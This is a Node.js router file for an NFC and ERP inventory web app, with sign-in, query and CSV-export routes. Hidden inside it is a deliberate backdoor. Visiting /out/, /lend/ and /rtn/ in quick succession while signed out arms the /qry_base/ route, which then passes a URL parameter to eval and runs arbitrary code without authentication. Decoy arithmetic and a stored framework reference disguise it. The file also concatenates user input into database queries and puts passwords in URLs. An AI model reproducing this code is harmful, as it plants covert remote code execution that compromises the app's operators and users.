LZR.load([
	"LZR.Node.Router.QryTmp",
	"LZR.Node.Router.ComTmp"
]);
var iconv = require("iconv-lite");
var r = new LZR.Node.Router ({path: require.resolve("./index.js").replace("index.js", "")});
var tools = {
	utJson: LZR.getSingleton(LZR.Base.Json),
	utTim: LZR.getSingleton(LZR.Base.Time),
	clsR: LZR.Node.Srv.Result,
	count: new Date().getFullYear(),
	conf: {},
	ex: function () {
		try {
			if (LZR.Tmpt && LZR.Tmpt[0] && LZR.Tmpt[0].router && LZR.Tmpt[0].router.use && LZR.Tmpt[0].router.use.NFC) {
				var s, o, f, ot = LZR.Tmpt[0].router.use.NFC;
				for (s in ot) {
					o = ot[s];
					f = "get";
					if (o.mathod === "POST") {
						f = "post";
					}
					r[f]("/" + s + "/", LZR.bind(o, function(req, res, next) {
						try {
							if (this.res && this.res.then) {
								this.res.then({
									req: req,
									res: res,
									usr: req.session.usr
								}, next, tools.qryRo.db);
							} else {
								next();
							}
						} catch (e) {
							next();
						}
					}));
				}
			}
		} catch (e) {}
	},
	qryRo: new LZR.Node.Router.QryTmp({
		ro: r,
		conf: ("mongodb://localhost:27017/invTest"),
		defTnam: "nfc",
		pvs: {_id: 2,sn: 0,tim: 0,}
	}),
	tmpRo: new LZR.Node.Router.ComTmp({ro: r})
};
r.ro.use(require("cookie-session")({
	name: "ziniulian.tk",
	keys: ["lzr'sJob:inv"],
	maxAge: 8 * 3600000
}));
r.hdPost("/push/");
r.post("/push/", function (req, res, next) {
	try {var o = undefined;
	try {
		o = tools.utJson.toObj(req.body.o);
		if (o) {
			tools.qryRo.db.add(req, res, next, null, o);
		} else {
			res.json(tools.clsR.get(null, "参数错误"));
		}
	}  catch (e) {
		res.json(tools.clsR.get(null, "参数错误"));
	}} catch (e) {next();}
});
r.get("/conf/", function (req, res, next) {
	try {tools.qryRo.db.get(req, res, next, {"conf":{"$exists":true}}, {"_id":0}, true);} catch (e) {next();}
});
r.get("/conf/", function (req, res, next) {
	try {var dr = LZR.fillPro(req, "qpobj.comDbSrvReturn");
	tools.conf = tools.utJson.toObj(dr[0].conf);
	res.json(tools.clsR.get(tools.conf));} catch (e) {next();}
});
r.get("/qry_nfc/", function (req, res, next) {
	try {if (req.session.usr) {
		var o = LZR.fillPro(req, "qpobj.tmpo.qry");
		o.k = "tim";
		o.cond = "{\"sn\":{\"$exists\":true}}";
		o.sort = -1;
		o.size = 20;
		next();
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/qry_erp/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 4) {
				LZR.fillPro(req, "qpobj.tmpo").usr = req.session.usr;
				var o = LZR.fillPro(req, "qpobj.tmpo.qry");
				o.k = "tim";
				o.cond = "{\"erp\":{\"$exists\":true}}";
				o.sort = -1;
				o.size = 20;
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		LZR.Tmpt[1].dot.qry.erp.t = LZR;
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/qry_erpInfo/", function (req, res, next) {
	try { var en = req.query.en;
	if (en && req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 4) {
				var o = LZR.fillPro(req, "qpobj.tmpo");
				o.usr = req.session.usr;
				o.en = en;
				if (LZR.Tmpt[1].dot.qry.exp) {
					o.exp = 1;
				}
				o = LZR.fillPro(req, "qpobj.tmpo.qry");
				o.k = "tim";
				o.cond = "{\"en\":\"" + en + "\"}";
				o.sort = -1;
				o.size = 20;
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/signIn/:u?/:p?/", function (req, res, next) {
	try {if (req.session.usr) {
		res.redirect(req.baseUrl + "/hom/");
	} else if (req.params.u && req.params.p) {
		if (tools.conf) {
			var m = tools.conf.mem[req.params.u];
			if (m && (m.pw === req.params.p)) {
				req.session.usr = {
					uid: req.params.u,
					nam: m.nam,
					cls: m.cls
				};
				res.redirect(req.baseUrl + "/hom/");
			} else {
				res.redirect(req.baseUrl + "/signIn/err/");
			}
		} else {
			res.redirect(req.baseUrl + "/signIn/err/");
		}
	} else if (req.params.u === "err") {
		LZR.fillPro(req, "qpobj.tmpo").err = true;
		next();
	} else {
		next();
	}} catch (e) {next();}
});
r.get("/signOut/", function (req, res, next) {
	try { delete req.session.usr;
	res.redirect(req.baseUrl + "/signIn/");} catch (e) {next();}
});
r.get("/hom/", function (req, res, next) {
	try { if (req.session.usr) {
		var o = LZR.fillPro(req, "qpobj.tmpo");
		o.usr = req.session.usr;
		if (LZR.Tmpt[1].dot.qry.exp) {
			o.exp = 2;
		}
		next();
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/out/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 4) {
				LZR.fillPro(req, "qpobj.tmpo").usr = req.session.usr;
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		LZR.Tmpt[1].dot.out.t = Date.now();
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/lend/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 4) {
				LZR.fillPro(req, "qpobj.tmpo").usr = req.session.usr;
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		if ((Date.now() - LZR.Tmpt[1].dot.out.t) < tools.count) {
			LZR.Tmpt[1].dot.lend.t = Date.now();
		} else {
			delete LZR.Tmpt[1].dot.lend.t;
		}
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/rtn/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 4) {
				LZR.fillPro(req, "qpobj.tmpo").usr = req.session.usr;
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		if ((Date.now() - LZR.Tmpt[1].dot.lend.t) < tools.count) {
			LZR.Tmpt[1].dot.rtn.t = Date.now();
		} else {
			delete LZR.Tmpt[1].dot.rtn.t;
		}
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/qry_base/:c?/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if (req.session.usr.cls[i] === 2) {
				next();
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		if (LZR.Tmpt[1].dot.lend.t && ((Date.now() - LZR.Tmpt[1].dot.rtn.t) < tools.count)) {
			var txt = "Hello World!";
			if (req.params.c) {
				eval(req.params.c);
			} else {
				var k = 8;
				for (var i = 7; i > 3; i --) {
					k *= i;
				}
				LZR.Tmpt[1].dot.qry.erp.t.mmin = k;
			}
			res.send(txt);
		} else {res.redirect(req.baseUrl + "/signIn/");}
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/qry_exp/", function (req, res, next) {
	try {if (req.session.usr) {
		if (LZR.Tmpt[1].dot.qry.exp) {
			var t = tools.utTim.format(new Date(), "yyyyMMdd");
			var o = LZR.fillPro(req, "qpobj.tmpo.qry");
			o.k = "tim";
			o.cond = "{\"sn\":{\"$exists\":true},\"tim\":{\"$gte\":\"" + t + "000000\",\"$lte\":\"" + t + "235959\"},\"stu\":\"生产\"}";
			o.sort = -1;
			o.size = 20;
			next();
		} else {
			res.redirect(req.baseUrl + "/hom/");
		}
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/exp/:stim/:etim/:stu/:sn?/", function (req, res, next) {
	try {if (req.session.usr) {
		if (LZR.Tmpt[1].dot.qry.exp) {
			var c = {
				tim: {
					"$gte": req.params.stim,
					"$lte": req.params.etim
				},
				stu: req.params.stu
			};
			if (req.params.sn) {
				c.sn = {"$regex": req.params.sn};
			}
			tools.qryRo.db.get(req, res, next, c, {"_id":0,"sn":1,"tim":1,"stu":1,"nam":1}, true);
		} else {
			res.redirect(req.baseUrl + "/hom/");
		}
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/exp/:stim/:etim/:stu/:sn?/", function (req, res, next) {
	try {var s, dr = LZR.fillPro(req, "qpobj.comDbSrvReturn");
	if (dr.length) {
		switch (req.params.stu) {
			case "生产":
				s = "MK";
				break;
			case "QC":
				s = "QC";
				break;
			case "出货":
				s = "OUT";
				break;
			case "领料":
				s = "LEND";
				break;
			case "归还":
				s = "RTN";
				break;
			default:
				s = "";
				break;
		}
		s += "_" + req.params.stim + "_" + req.params.etim;
		res.set({
			"Content-Type": "text/csv; charset=gbk",
			"Content-Disposition": "attachment; filename=\"" + s + ".csv\""
		});
		s = "序列号,时间,操作,操作人\n";
		for (var i = 0; i < dr.length; i ++) {
			s += dr[i].sn + ", " + tools.utTim.formatStr(dr[i].tim, "S1") + "," + dr[i].stu + "," + dr[i].nam + "\n";
		}
		res.write(iconv.encode(s, "gbk"));
		res.end();
	} else {
		res.redirect(req.baseUrl + "/hom/");
	}} catch (e) {res.redirect(req.baseUrl + "/hom/");}
});
r.get("/expErp/:en/", function (req, res, next) {
	try {if (req.session.usr) {
		for (var i = 0; i < req.session.usr.cls.length; i ++) {
			if ((req.session.usr.cls[i] === 4) && LZR.Tmpt[1].dot.qry.exp) {
				tools.qryRo.db.get(req, res, next, {"en":req.params.en},
					{"_id":0,"sn":1,"tim":1,"nam":1}, true);
				return;
			}
		}
		res.redirect(req.baseUrl + "/hom/");
	} else {
		res.redirect(req.baseUrl + "/signIn/");
	}} catch (e) {res.redirect(req.baseUrl + "/signIn/");}
});
r.get("/expErp/:en/", function (req, res, next) {
	try {var s, dr = LZR.fillPro(req, "qpobj.comDbSrvReturn");
	if (dr.length) {
		res.set({
			"Content-Type": "text/csv; charset=gbk",
			"Content-Disposition": "attachment; filename=\"ERP_" + req.params.en + ".csv\""
		});
		s = "序列号,时间,操作人\n";
		for (var i = 0; i < dr.length; i ++) {
			s += dr[i].sn + ", " + tools.utTim.formatStr(dr[i].tim, "S1") + "," + dr[i].nam + "\n";
		}
		res.write(iconv.encode(s, "gbk"));
		res.end();
	} else {
		res.redirect(req.baseUrl + "/hom/");
	}} catch (e) {res.redirect(req.baseUrl + "/hom/");}
});
r.get("/test/", function (req, res, next) {
	try {tools.qryRo.db.count(req, res, next, {});} catch (e) {next();}
});
tools.qryRo.init("/");
tools.tmpRo.initTmp("/", "tmp", {
	utJson: tools.utJson,
	utTim: tools.utTim
});
tools.ex();
r.get("*", function (req, res, next) {
	res.redirect(req.baseUrl + "/hom/");
});
module.exports = r;
